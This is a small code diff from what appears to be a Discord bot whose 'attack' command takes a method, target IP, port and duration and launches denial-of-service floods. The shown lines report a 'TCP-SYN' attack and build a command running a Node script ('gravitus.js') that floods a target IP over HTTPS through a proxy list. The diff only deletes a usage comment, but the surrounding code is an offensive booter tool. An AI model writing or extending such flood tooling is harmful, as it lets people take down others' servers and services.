@@ -148,7 +148,6 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'https-request':
-        # Example: node gravitus.js <ip> <time> 30 10 proxy.txt
         comando = f'node gravitus.js {ip} {tiempo_int} 30 10 proxy.txt'  # Adjust threads/rate as needed
         await ctx.send(f'Successful Attack HTTPs-Request TargetIP:{ip} Time:{tiempo_int}') #Port Removed Because Is Not Needed
 
